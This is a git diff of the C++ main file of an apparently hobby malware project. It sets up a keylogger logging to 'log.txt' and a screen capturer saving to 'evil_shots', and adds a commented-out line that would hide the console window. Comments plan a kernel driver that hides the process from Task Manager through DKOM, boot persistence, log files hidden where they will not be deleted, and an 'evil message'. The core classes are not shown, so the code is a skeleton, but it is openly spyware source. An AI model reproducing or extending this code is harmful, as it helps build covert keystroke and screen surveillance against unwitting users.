@@ -1,19 +1,30 @@
 #include <Windows.h>
 #include <iostream>
+#include <vector>
+#include <thread>
 
 #include "KeyLogger.h"
+#include "ScreenCapturer.h"
 
 int main()
 {
-	// Keylogger class V
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+	std::vector<std::thread> threads;
+
+	// Keylogger
 	KeyLogger keylogger("log.txt");
-	keylogger.Deploy();
+	//threads.push_back(std::thread(&KeyLogger::Deploy, &keylogger));
 	
-	// Screenshot capture class
+	// Screenshot capture
+	ScreenCapturer paparazzi("evil_shots");
+	//threads.push_back(std::thread(&ScreenCapturer::Deploy, &paparazzi));
 
 	// Desktop changer class
 
-	// process detacher class (hide the pogan process from task manager/dkom to detech the eprocess)
+	// Move the mouse a little on every mouse movement
+
+	// process detacher driver (hide the pogan process from task manager/dkom to detech the eprocess)
 
 	// Persistency actions (start on boot, put logfiles in a directory that is not expected, not deleted)
 
@@ -21,5 +32,12 @@ int main()
 	
 	// launch evil message in notepad
 
+	Sleep(10000);
+	keylogger.CleanUp();
+	paparazzi.CleanUp();
+	for (size_t i = 0; i < threads.size(); i++)
+	{
+		threads[i].join();
+	}
 	return 0;
 }
